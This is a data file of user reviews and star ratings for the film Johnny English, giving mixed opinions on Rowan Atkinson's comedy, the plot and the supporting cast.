"I generally only do these reviews for films that I've just seen for the first time but I'll make the occasional exception for ones that I have not seen since they first came out. Johnny English is one of those movies that I saw one time many, many moons ago and I've always wanted to see it again. I'm glad I made that decision, as this definitely deserves a higher rating than it currently holds among both critics and audience scores. The jokes very rarely fell flat, and I was genuinely, audibly laughing at parts of this film. Rowan Atkinson is one of the great comedic geniuses of all-time and while Johnny English can't match the greatness of his finest work, Mr. Bean, it still provides a solid hour and a half of good-natured entertainment. Turn your brain off, sit back and enjoy a very underrated gem from the brilliant mind of one of comedy's best.",3.5
"No inicio √© meio ruim, mas depois vai melhorando.",5
"Some good and original ideas. But why scatological jokes again? Only englishes can find it funny. Possibly it is homer-sexual jokes because it has the same effect as two guys kissing. Blech! Otherwise, the whole thing made a lot of sense. The villain, Pascal Sauvage, had a great plan that could probably work in real life: make an island a prison. The englishes did it many times, notably with Australia. So, I was rather disappointed when Sauvage lost it in the end. And like a big crybaby, as if kings were like that. The chase scene was original. The girl is really beautiful. Malkovitch was great with a good accent, except at the very end. Really, the film would have been better if the french had won. Then a rematch would have been obligated, etc.",2.5

"WHAT I LIKED: An amusing take on spy spoofs, 'Johnny English' is a lot of fun. This is mainly thanks to Rowan Atkinson who takes his every role onto the next level WHAT I DIDN'T LIKE: It suffers from an over-abundance of silliness that makes it so unbelieveable you occassionaly struggle to laugh (for example, the entire ending sequence) You have no care for the mission or the character as it lacks overall conviction VERDICT: A funny but mostly ridiculous spy spoof",3
Such A Good Laugh Rowan Atkinson Was Great,4
"Wish this movie was more long and funny otherwise the plot was good and Rowan Atkinston had a good portrayal as Johnny English. Still funny, but needs more comedy and a better runtime.",3.5
"If Rowan Atkinson doesn't make you laugh, then either you can't or the movie is so bad. The second in this case. I was waiting for a kicker - it never came. Should've rewatched some of Mr. Bean instead. Skip it.",1.5
Did not crack a smile or grin once during the crappy movie.,0.5
this movie is silly funny like Austin Powers or Despicable Me it's not a strong comedy but the silliness will make you giggle,3.5
"I'm sorry I just can't dislike movies with Rowan Atkinson, he always makes me laugh no matter how bad the script is. If you're not a Rowan Atkinson fan you will probably be bored.",3
It's sad that the man who gave us Bean had to give us this as well. Full review later.,1.5
What a terrible waste of time.,0.5
"I don't know why people hate this movie, what's not to like. This movie I found hilarious and very enjoyable.",4
"You'd be forgiven for thinking that Rowan Atkinson's secret service spy Johnny English is nothing else but a talking Mr Bean, with the character sharing more than a few similarities with Atkinson's more famous other creation. The film is really a spy spoof of take-your-pick James Bond film (pre Daniel Craig era), but with Johnny English as the bumbling inept central character rather than the suave, sophisticated James Bond. The plot has to do with stolen crown jewels (by baddy John Malkovich as Pascal Sauvage), leading to the forced abdication of the Queen, and with the attempted crowning of Sauvage as the new King of England. While it does have a few funny moments, all-in-all this is a pretty forgettable film.",2
Passable James Bond parody.,2.5
"Funny, well acted, no original and the jokes are the same that in other comedy genre movies",2
"Funny, well acted, no original and the jokes are the same that in other comedy genre movies,",2
Atkinson's act is very better than movie.,3
"Rowan Atkinson is the spoof version of Bond in the ultimate spy disaster movie 'Johnny English.' MI7 agent Johnny English, England's last hope for justice is wrongly assigned to the case of finding the mysterious whereabouts of the Crown Jewels, that were stolen by thieves working for a powerful criminal bent on forcing Her Majesty to abdicate so he can follow as her successor. It's bit of a weird name Johnny 'English' - an English agent from England carrying the surname of his nationality - you just wonder how the hack that worked out. It's bit strange even for a spoof movie making fun of the legendary Agent 007. Mr English is even more or less, stupidly, as dumb as his superiors, colleagues or even his closest sidekicks or enemies and is totally the last person you'd expect to be England's last hope for the country's security. Ben Miller is agent Bough, the loyal partner and smart sidekick of English. John Malkovich is Pascal Savage, the movie's main antagonist and menacing leader hoping to become the next ruler of England. Atkinson really gave his take on Mr English a fair effort just like he did with Mr Bean, he follows his mission steadily and pays close attention to his instructions, but damages the outcome with slapstick humour and the usual gags you normally get from spoof movies, but 'Johnny English' gets bad and worsens to a downside-d plot.",2.5
It has some mildly amusing moments.,3
"Not everyone's cup of tea though. If you like Monty Python, you'll probably like this. Its kind of slapstickish and its humor is very ironic. Hate it if you want,but I loved it.",5
Couldn't pull through the end.,0.5
"(60%) A passable spy spoof that gets by with a decent laugh every so often all the way through, Atkinson's comic aptness, some good support, and fun action sequences. It does labour at times, and is far from comedic brilliance, but fans of ""Bean"" should find at least something to enjoy here.",3
A pretty classic film. Predictable but highly enjoyable.,4
such a good&funny film :),5
"Very funny, with wonderful chemistry between Atkinson and Miller. Some of the critics really need to get a sense of humour.",4
It has been a long time since I laughed that much a comedy film. Rowan Atkinson is hilarious despite what critics say.,3.5
Three and a half stars.,3.5
"Stupid, idiotic, terribly acted, all together worthless, and yet I love it. Why? Because I loved it as a kid and even in all of its stupidity I still find Mr. Bean funny. Also, it doesn't hurt that Natalie Imbruglia is gorgeous.",3.5
A movie that makes me laugh every time I see it...Rowan was the right choice for this funny parody of James Bond,3.5
"blbost ako mraky, ale tak o tom to malo byt. myslim ze sa to velmi podaril a vznikla z toho skvela komedia",3.5
"This movie is really underrated, why do people dislike Johnny English? I think quite a funny comedy, the scene where the titular character lips syncs to ABBA in the bathroom in his underwear, who couldn't resist that?",4
"Johnny English is one of those films that I watched many many times as a kid due to Rowan Atkinson's natural comedic charm. After watching Johnny English Reborn and considering it to be absolutely hilarious, I decided to revisit Johnny English years later and find my mature opinion on it. Re-watching it, I can see why it is such a criticised film. I still enjoyed it, but Johnny English is certainly a deeply flawed film. The biggest fans of Rowan Atkinson may find Johnny English appealing, and since I fit into that context I can see how it is entertaining. But I can also see its major problems. Most of the jokes in Johnny English rely on the titular character going on a series of missions under orders from MI7 to protect the world, and every single time he manages to mess it up severely. In very the rare case he makes it out without problem, but most of the time the humour follows the same basic formula of sending him on a mission which is doomed to failure before sending him into another one for some reason. It is very repetitive and a lot of the jokes are hit and miss as well as dragged out for a bit too long without enough refreshing originality to truly justify it. But people on the search for any surprises can really not expect it from Johnny English. It manages to pull it off convincingly on a mostly successful note to ensure that it stays as a serious Spy Comedy with some elements of being a parody of one. Though story originality isn't really acknowledged because the film feels more like a repetitive series if vignettes than an actual singular narrator film. And although some of them are funny, there is no real consistency in it. For me, this could be because I have watched the film over 20 times, but it is also obviously because the story isn't structured well or balanced with humour too well. It seems like director Peter Howitt wanted to make Johnny English a legitimate spy film and a parody of one but failed to find the appropriate balance to make it work. He ends up attempting to make a family friendly spy comedy which unfortunately is a little too tame for its own good. So Johnny English certainly is not a well scripted film, and it is pretty lazy in that area. Most of the success is reliant on the visual elements of the film and more so Rowan Atkinson's talents in the titular role. Although Johnny English is over-reliant on it, it is still decent. Johnny English is a very convincing film at least. It has some entertaining action moments and some cool chases as well, so it captures the action aspect of a spy film without skimping on its comedic tone. And it is all filmed well with some great cinematography as well as some timely editing, and all of it is against the backdrop of an effective musical score. So Johnny English has a certain level of fun to it due to its light nature and it's convincing elements which include its great locations, it's convincing production design an the quality of its visual effects. Even the addition of the cool gadgets make Johnny English seem like a fun spy venture, so it certainly had enough strong technical qualities to make it entertaining to the more juvenile audiences, and it had a catchy theme song behalf of Robbie Williams as well. And Rowan Atkinson's lead performance does the most to determine if audiences will like the film or not. Rowan Atkinson doesn't have the same funny material from Blackadder or the same slapstick material from Mr. Bean, but the idea of him playing a spy is a very funny idea. Although the comedy in Johnny English is very repetitive, Rowan Atkinson works his best to make it seem fresh every time. And he manages to do it well because although Johnny English is not his funniest work, he doesn't imitate any of his previous work and simply makes this project one with a new character for him. Through restrained but funny line delivery which makes it feel as if the words come from his mouth naturally as well as a determined physical nature which makes him feel like a genuine spy, Rowan Atkinson works his hardest to makes Johnny English a memorable character and film. Without him, the material could not have succeeded, but because of his years of comedy experience and easy ability to work with comedic material presented to him, Rowan Atkinson takes on the lead role greatly. He is the source of practically all the comedy on the film for anyone who is able to find the feature funny, and so fans of him should hopefully enjoy his decision to take on such an eccentric role for a change. Rowan Atkinson is honestly really easily funny in Johnny English. John Malkovich is also a great presence. The versatile actor is best known for his eccentric dramatic work, so in Johnny English it is good to see him taking on a high profile comedy role. As well as nailing his French accent and the secretly antagonistic nature of the character, John Malkovich gives a comedic edge to his line delivery which is subtle yet effective, and he has some pretty funny moments. His chemistry with Rowan Atkinson is pretty decent to, so although his character Pascal Edward Sauvage is a thinly sketched figure, John Malkovich does enough for the part so that audiences find him to be a decent casting decision. Ben Miller and Natalie Imbruglia give fairly effective supporting efforts as well although stuck within the limitations of the script. So although Johnny English is a clumsily written comedy which doesn't really have as much humour as it should, thanks to a stylish look and Rowan Atkinson's work in the titular role, it should hopefully do enough to entertain most of his fans.",3

Rottentomatoes doesn't understand british humour...,4
Just Plain Silly Good-ol Fun. If You Want A Movie That Can Give Ya Laughs Well Just Rent This!,3.5
"Although not recommendable as a 'good film' in any enterprise, the simple minded humour and light-hearted essence of Johnny English makes it just a silly and playful James Bond spoof.",3.5
"Mike Myers already did a decent spy film spoof, so this film was unnecessary. Minimal laughs are to be found here.",2
a brilliant comedy. a bit watered down for my liking but what a very good film it is.,4
"A fun well filmed movie that will have you laughing throughout. Many innuendoes to other spy movies however, the story is rather thin and relies to much on Rowan and his comedy prowess. One feels that it could have been done better rather than making a movie just for young children, from Rowans previous advertising scenes. Nibbles: Candy floss.",1
"Johnny English must stop a rich Frenchman from taking the British throne. I think I might have enjoyed this movie more when I first saw it ten years ago but there's no denying that this is simply a Mr Bean movie where he gets to play a secret agent instead. Through a breach of security, all of Britain's top agents are killed, leaving Johnny English to work on a case where the Crown Jewels are stolen. This turns into a pursuit of Pascal Sauvage, a Frenchman who has his eyes on the throne. Basically, Johnny English doesn't accomplish anything in this movie. The intelligence is left to Bough and double agent Lorna Campbell. The jokes become predictable and almost tiresome as the movie progresses. Don't get me wrong, it is funny but it would have been better to have named it Bean: Secret Agent and call it what it is!",2.5
Probably needed more than 1 eye on the screen to enjoy it properly,2
"Rowan Atkinson gives a great performance as usual, but it isn't enough to save Johnny English from it's boring, predictable story. The spy genre has been parodied several times before, and Johnny English adds nothing new to the mix. And worst of all, it's just not that funny.",2
"Not original. It doesn't even come close to memorable, but you gotta love Rowan Atkinson.",2
I remember the old adverts that had this character originally. He was funny then...in short bursts! Unfortunately Mike Myers has spoofed the spy genre too well and although this tries to go after the Moore/Brosnan type spy it still pales in comparison. Some of the jokes are funny and Atkinson is at his best when he allows his physicality to do most of the work but a lot of it feels laboured and what's Malkovich doing in this type of film!?!!! Can't believe this was popular enough to get a sequel! It's not terrible but it's hardly the peak of British humour.,2.5

As a Rowan Atkinson fan I am biased but Johnny English had me laughing for a good portion of the movie. At's an odd sort of parody but for what it is it works.,3
"The movie is tops. I wanted to buy a DVD collection on British cinema, or to put it in mild terms, British movies. I came to know, later, why I must. Rowan Atkinson is the best English actor, after Richard Burton. I mean, I can admire him like I do, Sir Alec Guinness also. The movie was not a comedy, because I didn't smile, nor laugh, but it was supposed to be, seriously, one. I didn't watch Mr. Bean, but I loved the song 'Picture of you'. I remember wanting the song on demand on Cable T. V. in Mumbai. But, anyway, this was not because of Mr. Atkinson, or Mr. Bean. I never knew I could smile being fully aware, that there is no reason to, and I am not.",5
"A quite funny spy spoof film, Rowan Atkinson plays a good part, Silly in places but worth watching.",3
"I love this movie!! It's really stupid, and pointless, but i like it anyway! Definately worth watching at least once...",4.5
"Definitely a guilty pleasure movie; I love Johnny English simply because Rowan Atkinson is brilliant with his comedy. The movie is predictable and the plot really isn't that fantastic, but I dare you to try and watch this movie and not be entertained. It's a feel good movie and will get you to laugh no matter what type of movie you like. It's supposed to be corny - it's a James Bond spinoff, so naturally it's James Bond, if James was a lot more stupid and awkward. I've always been a fan of Rowan, and this movie is definitely very his style.",4
"While this may guarantee a few laughs for your kids, it does little for older audiences. It's only slightly more amusing than some of Bond's sillier encounters.",3
"This was a terrible movie. So bad, that i stopped watching after five minutes.",1

On the whole the film is entertaining enough, but it leaves one wondering after every single scene: Is this the best they could do?",2
"The original ""Johnny English"" movie is immensely silly and pretty dumb, but I did find myself laughing at a few moments in the movie. This movie is obviously not meant to be taken seriously and I think it delivers what I expected. The story isn't particularly interesting but the humor lands often. If you are a fan of Rowan Atkinson's style of humor, the movie is fine for a one time watch. Just take it for what it is and have some moderate amount of fun with it.",3

Really good &* funny film! Just a classic!,4
funny and stupid at the same time hahaha,5
looked funny... wasn't,0.5
This movie furthers my belief that Rowan Atkinson is England's Adam Sandler.,0.5
Gotta say I loved this film. Even when others think it is too silly.,4
this film is fantastic!!!,4.5
"A tratti esilarante, ma i tempi comici di Atkinson sono quelli del Mr Bean televisivo. Alla lunga non regge.",3
love all mr.bean and rowan atkinson films!!! hilarious,5
"The ""Mr. Bean"" moments are awesome, but the whole story is so utterly ridiculous, and the villain is so horrifically acted, that this film winds up being as harmful to its own cause as Johnny English himself.",2
If u love Mr. Bean u are gunna like this movie,4
"Rowan Atkinson is great, but even he can't save this dull, clunky film from failing miserably.",2
"Mr. Bean trys to be James Bond, and sadly fails.",0.5
"Love this film, so hilarious!",5
The kids loved it and we chuckled through it too!,3.5
Awesome Bond spoof. Atkinson does it again.,4
"Johnny English contains some truly hilarious moments, but for the most part it is let down by long, unfunny stretches and a generally nonsensical plot.",2
Atkinson is hilarious in the best British spy spoof there is!,4
"The problem with some critics is that your just too close minded, you went into that theatre trying to draw information on the film watching it profusely from every angle. but you cant watch johnny english like that you have to let you suck you in, A great many people i know have watched this film and ended up in stitches. People who say he is a good comical actor but is wasted on this are wrong, Rowan atkinson is far from in the need of money and the fact he has signed himself to Reborn shows he really does believe in the JE franchise",5
"If I didn't feel like ruthlessly tearing this film apart at the moment, I could simply copy and paste the majority of my review of Shawn Levy's The Pink Panther, as many of my points in that review apply to Johnny English (not to mention that both films are nearly identical). And yet, Johnny English is even worse, and while at least the Pink Panther provided a meager handful of infrequent chuckles, Johnny English has little to no working gags. Once again, I am disgusted by the low standards of live action children's cinema- that is, if I dare to refer to this inexcusably terrible piece of formulaic tripe as cinema. There's hardly any plot in Johnny English. The majority of the film is made up of loosely related action/comedy scenarios that are neither exciting, nor comedic. The bare bones plot of the film is that Johnny English- by account of an absurdly violent incident at the beginning of the film resulting in the death of every other agent in the country- is the only living secret agent in England, and therefore, the only person that can uncover the secret behind some stolen jewels. Teamed with his partner, Angus Bough (who contradicts the film's previous statement that all of the other agents have died), they must uncover the missing jewels, as well as stop an evil ""genius"" from becoming king. Johnny English has almost nothing that will appeal to anyone over the age of 9 (and I am sorry to insult those 1-9 year-olds in this manner). All the children's film cliches are here, including poop jokes, silly dancing, a bumbling main character, and dozens of other unfortunate elements. The humor is also subject to not one, but two shots of a man's bare bottom (one of which is an extended bit), and an alarmingly raunchy scene of innuendo that struck me as completely out of place for a PG film. In addition to quite a bit of violence, and a surprising amount of language, I can't imagine what parent would feel comfortable letting their kids watch this. And yet, as I stated before, there is nearly nothing here that could possibly be enjoyable to anyone whose age is in their double digits. At times, Johnny English is downright insulting in it's stupidity, and general laziness. We've seen everything in this film before in other movies. Just rarely this poorly. Johnny English is also an extremely predictable movie, with gags that can be predicted before they even begin to occur. There's not an original gag in this film, and I struggle to think of any funny one(s). Rowan Atikson tries hard as Johnny English, but he cannot make the material work, no matter how silly his faces. John Malkovich as the villain, Pascal Sauvage, sports what might be the worst, unintentionally bad French accent I've ever seen in a feature film. Supporting actors like Ben Miller and Natalie Imbruglia are so forgettable and weak in their roles, that they're hardly worth mention. The only vaguely bright spot about this film is its half-way decent score, composed by Edward Shearmur. Purposefully emphasizing on spy cliches, the score is actually pretty fun at times, if somewhat formulaic. Unfunny, even vulgar, and an utter failure in almost every respect (not to mention sloppily edited, and poorly shot), Johnny English is one of the worst kids films I've seen in recent memory- an impressive feat. Consistently defying logic, physics, and my tolerance, Johnny English is an aggressively bad film. Other than acknowledge the score again, the best thing I can say about Johnny English is that its only 88 minutes. And yet, that is certainly 88 minutes too long.",0.5

Too much Mr. Bean in it. I rate films out of 4 stars. (2/4),2
"rowan atkinson is great as an incredibly stupid secret agent in this action/comedy that is full of excitingly funny action scenes, such as the hilarious freeway chase scene. recommendable to all.",3.5
SO FUNNY! Johnny tries but he just can't get anything right.,4
a brilliant bond pisstake,3.5
love it !!!!!!!! it was sooo funny,5
"The movie is really silly, but I was amused. You definitely need to be a fan of Atkinson to enjoy, and if you aren't don't bother. Check it out for fans of Atkinson only.",3
I love Rowan but this movie was awful,1.5
for those who love rowan atkinson...a one time watch funny movie,3
I loved the plot but it was not as funny as Johnny English Reborn,4.5
Atkinson delivered an entertaining performance in this non Mr. Bean film.,4
"Johnny English: As far as I'm concerned, the only thing the French should be allowed to host is an invasion. I have always enjoyed Rowan Atkinson and his brand of comedy and going in I knew I would enjoy this film and I did. Now this film is not perfect by any means, the story is okay, the script is okay, but it is the sequences and mayhem that are in this film that make it such a fun and enjoyable comedy. The acting is pretty good as well as the characters, especially the Johnny English character who I think is Rowan's best character yet. Overall this is a fun film that is worth the watch if you have not seen it yet.",3
I thought it was predictable and that the script lacked humour. I think the actors did the best they could but I would not recommend going to this film unless you are going to watch it with your children.,1.5
"Although it is almost unforgivably goofy, there are still enough laughs within ""Johnny English"" to garner a couple more viewings.",3.5
"The James Bond parody is funny with Mr. Bean parodying the famous secret agent, but the parody isn't as funny as the Star Trek parody ""Galaxy Quest."" (B-) (Full review coming soon)",3
"not bad, some laughs",3
Sacarstic-slapstick British comedy that would please then baffle James Bond and Hubert Bonisseur. [A] completely unnecessary and nearly chuckle-free spy movie spoof. With the exception of the hidden videos of the aloof spy wannabe in the bathroom dancing to ABBA. Rowan Atkinsons is best known for his alter- ego and internationally loved Mr. Bean. Who made Atkinsons a household name for a reason.,3
A decent effort. Sadly he can't carry a film on his own.,3

"This is an hilariously stupid movie - in the way Laurel & Hardy or the Three Stooges were hilariously stupid. Cue the speeding Aston Martin, the beautiful and super-competent woman, the high-tech weaponry, the arch-villain, the deadly thugs, the gunfights in car parks - and the have them all superbly mishandled by Mister Bean. Delightful escapist nonsense.",4
SECOND BEST MOVIE EVER!!,5
"Kinda funny, kinda stupid",3
"Johnny English is a horrible attempt at doing yet another parody of James Bond. The genre had been parodied with the superior Austin Powers, but it seems like they needed yet another spoof flick to make a bit more money. This film fails at delivering effective laughs. Rowan Atkinson is tiresome and boring here, and you can see the career of a once great comedian fall apart on-screen. Atkinson has created one of comedies greatest characters with Mr. Bean. However with this film, he delivers a painfully unfunny performance that doesn't cut it. This is a pointless film, and if you're looking for the spy film parody, watch the Austin Powers films instead. Rowan Atkinson is wasted here, and he has displayed better comedic performances in the past. This film is simply a misfire. I really didn't enjoy the film, as I felt that the joke were predictable, and overdone. This film was a letdown, and I expected better from Rowan Atkinson. Essentially this is Mr. Bean as a spy, and nothing more. Johnny English could have been good, but it suffers from a poor script, and poor acting. This comedy isn't funny, and there are more bad things with it than good. Rowan Atkinson has done better in the past, but with this one he misses the mark big time. Watch Austin Powers instead. Johnny English is a case of it's been done before, and better too.",1
"Even though Rowan Atinkson is perfect for the role of Johnny English, he is let down by a weak script, fusty dialogue, and gags and jokes that aren't funny.",1
HHHHiiiiiLLLLaaarrrrIIIIIooouuusss,5
"The concept and jokes might be typical of any spy-spoof imaginable, the cast isn't a great choice, there's little technical intricasy to be considered for praise and the emphesis on being British is slighly overdone. However, Rowan Atkinson as the title character is charming and talented enough for me to wish to follow him and is the main reason these jokes are enough to make me laugh to myself.",3
Funny movie...so stupid it's funny.,4
"I like this movie. Most of the jokes are really funny, with the exception of a few.",3.5
"Thought this was funny and took the fun out of James Bond alot which as a James Bond fan I found funny. Was some boring bits however when you kinda just thought ""oh just get on with it""",3
"I don't know how this movie got popular enough to warrant a sequel. It's one of the dumbest movies I've ever seen, and I certainly have doubt that this is one of the worst movies of all time. It's basically a spoof of the newer James Bond films, as opposed to Austin Powers, which lampooned the older James Bond films, and did that much better than this awful movie. The premise is absolutely ridiculous, to the point that it would have a better movie if it were Rowan Atkinson going on a drunken rampage. Sadly, that wouldn't accurately sum up this movie. The characters are just awful, and the acting is even worse. John Malkovich can do better than the stereotypically racist performance he gave as the film's villain. The film's overall style tries to copy the Bond films that featured Pierce Brosnan, but it does a shoddy job at that. Though there are a few decent jokes, the film's sense of humour is appallingly tame, and that fact makes me feel bad if any part of the film does turn out to be funny. Overall, it's just terrible in every sense of the word, and I feel bad that I used to watch it.",1
Too many cringey moments stop it from being enjoyable.,2
My Rating: 2.5/5 stars; Grade: C+; Gesture: Thumbs Sideways; Status: Mediocre or So-So (Rotten); Emoticon: :-|.,2.5
"Great movie, very funny.",3
"Johnny English doesn't work as a spoof of the spy genre, and moreover, as you watch Atkinson at work, you begin to notice how easy this is for him--too easy, in fact.",3
"It cleverly spoofs the spy genre and Rowan Atkinson's comedic talent certainly helps to entertain, but the film's protagonist is incompetent to the point of frustration and becomes almost unrelatable.",3
"I love Mr.Bean, but this wasn't Mr. Bean",2.5
"I agree with most of the reviews Rotten Tomatoes posts, but this is just plain wrong! Johnny English is an absolute classic which has audiences of all ages in stitches. Maybe you have to be British to get the humor, but this is without doubt one of the funniest films since the turn of the century. Outraged at the audience and critic reaction to this film!",5
"I've seen this film so many times since I was only 7, so thats probably why I love it so much.",4.5

Overall funny but there are some moments that are just disturbing.,3
i personally think its absolutely brilliant!! i love rowan attkinson and made me laugh all the way through!!,5
Hmmmm si si divertida perooooo hmmmm,3
"This James Bond parody led by the King of comedy Rowan Atkinson who plays the title character Johnny English is just picture perfect! The story is about Johnny English who is being promoted as super spy after Agent One and and everyone else is being blown up at a funeral. When billionaire Pascal Sauvage sponsors an exhibition of the crown jewels and the valuable gems disappear on that night, it is now Johnny's duty to solve the case. Tracking the thieves underground with his respected sidekick Bough. and maybe the mysterious Lorna who always turns up at the wrong place at the wrong time could lend a helping hand for Johnny to stop the thieves that stole the jewels to try and be king. Pretty funny after Rowan Atkinson owned Mr.Bean, he certainly owned another iconic role, Johnny English. Pretty action packed and solid scripted, Johnny English gets a 9/10.",4.5

A fantastic comedy! Rowan Atkinson is a great actor and this film doesn't disappoint!,4
good laugh. but he is a bit too stupid -_-,4
"I look back at this movie and realize how lame, poorly written, and unfunny it is. But, when I was a kid I saw this movie a million times and I loved it so much. I would quote some of the lines, talk like some of the characters, and even try to re-create some of the stunts myself. This is a completely dumb and stupid movie, but it's such a nostalgic gem from my childhood and I'll always remember this as one of my favorite comedies.",4
"Agent spoof movie starring Rowan Atkinson, once voted ""funniest man alive"". An uneven ride, really, where the humor ranges from genuine fun, to flat spot-it-a-mile-away jokes, to being downright cringeworthy. Add to it that, aside from Atkinson, none of the characters are very interesting or add to the humor in the slightest. Still, Johnny English is an enjoyable film and - as family-oriented comedies in general and spoof movies in particular go - you can do a lot worse. Mr English might not be a man of all seasons, but when you're looking for easy comedy, he's your man.",2
"Amusing enough to redeem an hour and a half, Johnny English is barely funny enough to compensate its unoriginal theft of Get Smart among other spy parody films.",3
thought it was really kwl when i first watched it but now i think it's rediculas >< but still really funny,3
Funny but insanely predictable,3
hmmmmmmmm Rowan as a spy lol totally nuts but OMG Natalie Imbruglia is the whole point to watch this movie WHO SAYS SHE CAN ONLY SING .,4.5

"Johnny English was just trying to be a fun slapstick, but the main character is just Rowan Atkinson playing himself but with a different name. He doesn't do anything unique, its the same routine we always see with him, even if he is a funny guy. As for the script, it really doesn't go anywhere or do anything, and having John Malkovich in the movie was pointless, the only thing he was good for was for some people to say ""hey look, that's John Malkovich."" It wasn't a disaster, I laughed at points in the film, up until there was a scene wher he gets covered in poop from crawling through the pipes and I lost all hope for this film. The film just seemed pointless, but I laughed a few times so go see this if you enjoy a slapstick about a spy.",2
An absolutely hillarious spy spood. Rowan Atkinson at his comedy best in what in my opinion is a comedy gem.,4

"Johnny English is a pretty good, under rated spy spoof. It's funny and made me laugh pretty many times, however I'm a big Mr. Bean fan. If you're not, you may not find the material as funny. There's also some action-filled spy parts but comedy still surrounds these scenes. Many seem to compare it to the Austin Powers series, but it's very different. Johnny English has more of a family movie feel to it. The story is pretty good for a parody flick even if it can be dumb at sometimes. The cast is good as well with Atkinson stealing the show, of course. Malkovich is great, as always and Imbruglia is nice to look at throughout.

"Review: Johnny English Well, I must say I was pleasantly surprised when I watched this movie. I have seen it before, some years ago, but with my bad memory I might as well not have. Had not my expectations been so high from the last time I saw it I would have enjoyed it even more than I did. There are many foolish young lads and lasses out in the world who dislike Rowan Atkinson for some reason, they are of course entitled to an opinion of their own, but I will never in a million years get how someone can think that Mr. Atkinson is less than an amazing actor. No sir, that I will not! This movie was packed with both action and comedy, but especially comedy. There were some surprises I didn't see coming and there were some great old-time clich√©s. There were both hatred and anger, romance and love in this hilarious comedy, and a perfect balance between them as well. The music was very enjoyable, I always enjoy a good song by Robbie Williams. Not only was it enjoyable, it fit the movie as well. It was written especially for this movie so, if it hadn't fit that would just be a job, not well done. The characters in the movie all play their own parts of this brilliancy. I think they all are like a glove on a hand. One giant puzzle, that fits perfectly together. It is now finally time for my conclusion and rating of the movie. Because of the great acting, music, storyline, surprises and the whole bole of royal excellence, I, Mr. J.J. Shevy, give this movie, Johnny English, 7/10 stars. I really hope you enjoyed this movie as much as I did. Bonsoir! Goodnight to you all! - Shevy",3.5
"SCENE: Writers Neal Purvis, Robert Wade, William Davies Purvis: What's a horrible idea we can make into a movie? Wade: How about a spy-spoof that's not funny, not intelligent, and not in any way, shape, or form interesting? Davies: You mean the exact opposite of the James Bond series? Wade: Exactly! In fact, the spy agency is MI7 instead of MI6!!! Purvis: Great, but remember we will need some horrible writing, that guy from Mr. Bean, and a slew of gags that aren't that interesting. Wade: So it's like ""Get Smart"" only less enjoyable? Purvis: Yup!!! Davies: No, we need to make it as INTOLERABLE as possible. Let's have a two-dimensional villain as well, and a classic jewelry thievery. Wade: Wouldn't people expect a world-conquering mastermind in a Bond spoof? Davies: Yes, but we won't give it to them. It will make the film more interesting with it's blandness! Purvis: Well guys, let's get writing! I'm more than positive that's how the discussion for this movie's genesis came about.",1.5

Hilarious. Must see for any Rowan Atkinson fan.,4
"Hilariously crazy! I don't know whether to laugh or cry over English. Wow. Well, I chose the former. :))",3.5
40% I didn't laugh at all.,2
OK... from the beginning was funny but a bit later started to get boring and very predictable...,3
"Getting away from his silly 'Mr.Bean' character which I'm sure some people just love and adore, Rowan jumps into the role of James Bond 007, super spy spoof, Johnny English. According to some watched bonus material, the idea of Johnny English came from Rowan Atkinson doing some 'shorts' or 'mini-movies' for a credit card advert of some kind, developed the idea and thought about creating a movie of that character. This movie still has plenty of humour as does 'Mr. Bean' but a bit more realistic and a lot more happening in regards to action. A little more up my street in regards to plot and content too. His incompetence is amusing to watch and his character is more civilised and English compared to say 'Austin Powers' so he pulls it off well, the illusion of being a spy but unfortunately a clumsy and dim-witted one.",3
"Watched this, as I saw the sequel, thought I'd catch the original. It wasn't as good. Was some funny moments.",2.5
this film was extremly annoying but it was funny.,3
"Charming character, just a poor script and dumb storyline makes is awkward at times to watch.",1
Fantastic British parody of a fantastic British spy genre. Rowan Atkinson is a legend :D,4.5
"There's a few chuckle-worthy moments but overall, it's not great - not even John Malkovich can make that happen in this flick. English is a likeable character (most of the time) but his hijinks are way too predictable and nobody should be allowed to say ""bottom"" that many times in eighty-four minutes. Better luck next time.",2
Very very humorous! Entertaining!,4
I can't help it. Rowan Atkinson's lovable goofiness always has me rolling in the isles. It's a masterpiece.,5
if you want a good laugh.,3
"Well seeing as the sequel is out now I thought I would revisit this original comedy but I was disappointed with how badly this has aged and how lame it is. The film of course is a 'Bond' spoof which in hand is so so so unoriginal and boring as its been done to death many times whilst on the other hand the film does almost ignore the much better advertisements for 'Barclaycard' which the film is based on. The original short adverts were so much better than the film probably because they were short and sweet where as the film is just too dull and literately uses every old trick in the book for laughs, shamelessly so, whilst being unbelievably predictable, childish and completely unfunny. Lets hope the sequel is better with alittle more clever humour and less chucklevision humour, the original adverts did use the same type of humour but it was alittle more subtle where as this is just dumb kiddie stuff.",1.5
Without Rowan this film wouldn't have been enjoyable at all... John Malkovich with an accent almost killed this film.,3.5
"Everyone I speak to says that they cry from laughter watching this film, Ill agree that it hasn't got a 5 star storyline, but its not bad, and Rowan Atkinson by far makes up for it with amazing acting and some of the best lines I've heard. By far my favorite movie ever. This rating is ludicrously low, I think that it should be at least 90%. Honestly, if you want real reviews of this movie, find a clip on youtube and see what the comments say. I think that the problem with this site is that not enough young people (under 25) post comments and theres almost no young critics, so you get a very warped view of a lot of movies.",5
"Definitely nowhere near as funny when you're older compared to when you're in your teens. There are a few moments that are still amusing, but to be perfectly honest that's pretty much guaranteed when it comes to portraying stupidity in comedy. Oh and someone please tell John Malcovich his french accent is terrible",2.5
"dumb and humorous, i'll never be tired of this movie",4
Entertaining.. Would like to watch it again..,2
LoL! Can't stop laughing. This one just made my evening.,3.5
"Underrated. The film was funny, didn't deserve to be a flop.",3.5
"Spy Hard only British. Rowan Atkinson is really smart when you see him in interviews...Mr. Bean may have been kinda silly, but it was never dumb, and Blackadder is one of the best Britcoms ever made - very intelligent. So what would convince him to sink so low with this weak tired comedy? If money was the answer...it didn't pay off.",1
"Not a masterpiece by any stretch of the imagination, but definitely worth seeing for any Atkinson fan, or fan of British humor in general, if you've run out of Monty Python.",3.5
Cringe Worthy spy spoof which has the occasional laugh but features decent performance by Rowan Atkinson! This film is a lot of fun but does go that step too far sometimes!Also Features the occasional action sequence and memorable gags! Good fun but should of been better!,3.5
poor comedy that isn't worth watching,1
"Great comedy. Hilarious, and entertaining, and very underrated. Rowan Atkinson is excellent.",4
"I was surprised to learn this film was getting a sequel. The original was a spoof of spy films that had the kind of predictable and slapstick humor that 'spoof"" implies but it still generated a couple of laughs. And Malkovich actually does a broad French accent here--and he didn't in Man in the Iron Mask. (Weird.) VERY silly but a bit of fun too.",3
"Despite the poor reviews, this film apparently made 160 million, so it's strange it has taken 7 years to get around to a sequel. Silly, harmless fun.",3
